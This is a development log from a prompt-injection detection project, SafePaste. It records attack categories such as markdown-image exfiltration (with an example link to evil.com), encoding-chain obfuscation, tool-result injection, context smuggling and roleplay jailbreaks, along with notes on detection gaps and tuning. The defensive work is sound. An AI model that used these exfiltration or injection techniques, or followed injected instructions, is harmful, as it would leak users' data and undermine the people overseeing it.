# Security Research Log

This is a chronological, append-only log of security discoveries made during SafePaste development sessions. Entries capture observations, hypotheses, and insights about prompt injection attacks that don't yet belong in the attack taxonomy or detection strategies.

**When an entry matures into actionable work**, it gets promoted:
- New attack technique → `docs/security/attack-taxonomy.md`
- Detection improvement → `docs/security/detection-strategies.md` or `packages/core/patterns.js`
- Backlog item → `docs/backlog.md`

**Entry format:** Date, session #, observation, classification, action.

---

## Entries

### 2026-01-15 — Session #0 (pre-documentation)
**Classification:** Detection improvement idea
**Observation:** Exfiltration via markdown image links (`![](https://evil.com/steal?data=...)`) is uniquely dangerous because it can silently transmit AI responses to an attacker's server. Unlike other attack categories, exfiltration should never be dampened by benign context detection — even in educational content, a live exfiltration link is a real threat.
**Action:** Implemented. `applyDampening()` in `detect.js` checks `hasExfiltrationMatch()` and skips dampening if true. Exfiltration patterns always trigger at full weight.

### 2026-01-15 — Session #0 (pre-documentation)
**Classification:** New attack technique (undetected)
**Observation:** Encoding chains beyond base64/hex/rot13 are an open gap. Attackers can use custom encodings, cipher references, or multi-step encoding chains (e.g., "base64 decode this, then rot13 the result") to hide payloads. The current `encoding.obfuscated` pattern only catches direct references to three encoding types.
**Action:** Deferred. Added to "NOT YET DETECTED" section in attack-taxonomy.md. Addressing this requires either more encoding-specific patterns or a fundamentally different detection approach.

### 2026-03-12 — Session #1
**Classification:** New attack technique (undetected)
**Observation:** Indirect prompt injection via tool use is a growing threat in AI agent systems. When an agent uses tools (web search, code execution, document retrieval), the tool responses can contain injection payloads that the agent processes as trusted context. This attack vector is fundamentally different from direct clipboard-based injection because the user never sees the malicious text.
**Action:** Deferred. Documented in attack taxonomy "NOT YET DETECTED" section. Addressing this is part of SDK roadmap Phase 3 (SafePaste Guard — agent runtime security).

### 2026-03-14 — Session #7
**Classification:** Evaluation methodology insight
**Observation:** The partition algorithm (`partition.js`) has dead zones at curated sizes n=6 and n=7 where `ceil(n*0.6) + ceil(n*0.2) = n`, leaving zero records for benchmark. This caused 9 of 17 categories to have no benchmark representation despite having 3-7 curated examples. Safe curated targets are n=5 (1 benchmark) or n=8+ (1+ benchmark). The double-ceil rounding is inherent to the 60/20/20 split.
**Action:** Expanded curated corpus to avoid dead zones (all categories now at n=5 or n=8). Documented for future corpus growth planning.

### 2026-03-14 — Session #7
**Classification:** Detection gap analysis
**Observation:** context_smuggling (hiding instructions in legitimate business documents like meeting agendas, customer feedback, FAQ pages) fundamentally resists regex-based detection. Any regex that catches these would false-positive on real business text. This category serves as a natural benchmark for future ML-based detection and should remain `detected: false` in the regex engine.
**Action:** Documented as inherent regex limitation. Category stays `detected: false`. Added diverse curated examples (8 total) for future ML training/evaluation.

### 2026-03-14 — Session #8
**Classification:** Detection pattern design insight
**Observation:** When fixing false negatives via pattern stacking (multiple low-weight patterns combining to exceed threshold), each pattern must detect a genuinely distinct attack signal — not just be a "score padding" pattern. The anti-overfitting principle: no pattern should be designed to match *only* the benchmark record; each must match a *class* of attack text. Verified via FP sweep: 19 expected_flagged=false records, 0 score changes, 0 new false positives.
**Action:** Applied in v0.3.0. Stacking fixes for secrecy_manipulation (false_privacy+speak_freely), instruction_chaining (step_enumeration+privilege_escalation), and role_hijacking (hijack_system+elevated_privileges) each detect independent attack dimensions.

### 2026-03-14 — Session #8
**Classification:** Detection gap analysis
**Observation:** roleplay_jailbreak (0.49 recall) and multi_turn_injection (0.40 recall) are the hardest categories for regex detection. Roleplay attacks that avoid explicit "no restrictions/safety" language score 0 (subtle framing). Multi-turn attacks using conversational manipulation ("you said earlier...") often trigger only one pattern (25 or 22) and fall below threshold=35. These categories represent the practical ceiling for regex-based detection.
**Action:** Documented. These categories are candidates for ML-based detection in Phase 2+ of the SDK roadmap.
